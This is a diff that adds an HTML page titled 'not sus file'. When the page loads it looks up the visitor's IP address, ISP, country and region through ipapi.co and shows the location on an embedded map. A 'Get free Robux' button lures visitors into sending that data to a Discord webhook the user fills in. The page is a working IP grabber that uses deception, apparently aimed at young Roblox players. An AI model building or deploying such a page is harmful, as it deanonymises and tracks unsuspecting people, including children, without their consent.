@@ -1,0 +1,77 @@
+<!-- go to "obvouscated_test.html" for explaining-->
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <title>not sus file</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+<body>
+    <table border="1" cellpadding="5">
+        <tr>
+            <td>IP Address</td>
+            <td id="ip"></td>
+        </tr>
+        <tr>
+            <td>ISP</td>
+            <td id="isp"></td>
+        </tr>
+        <tr>
+            <td>Country</td>
+            <td id="country"></td>
+        </tr>
+        <tr>
+            <td>City</td>
+            <td id="city"></td>
+        </tr>
+        <tr>
+            <td>Google Maps</td>
+            <td>
+                <iframe src="" id="gmaps" width="400" height="400"></iframe>
+            </td>
+        </tr>
+    </table>
+
+    <button onclick="sendMessage()">Get free Robux</button>
+
+    <script type="text/javascript">
+        function sendMessage() {
+            var webhookURL = 'webhook here'; // insert your discord webhook URL here
+            var ip = $('#ip').text();
+            var isp = $('#isp').text();
+            var country = $('#country').text();
+            var city = $('#city').text();
+            var message = {
+                content: 'IP: ' + ip + '\nISP: ' + isp + '\nLand: ' + country + '\nStadt: ' + city
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('error at sending data:', response);
+                } else {
+                    console.log('data sent succesfullly!');
+                }
+            })
+            .catch(error => {
+                console.error('error at sending data:', error);
+            });
+        }
+
+        $.getJSON('https://ipapi.co/json/', function(data){
+            $("#ip").text(data.ip);
+            $('#isp').text(data.org);
+            $('#country').text(data.country_name);
+            $('#city').text(data.region);
+            $("#gmaps").attr("src", "https://www.google.com/maps?q="+data.latitude+","+data.longitude+"&output=embed");
+        });
+    </script>
+</body>
+</html>
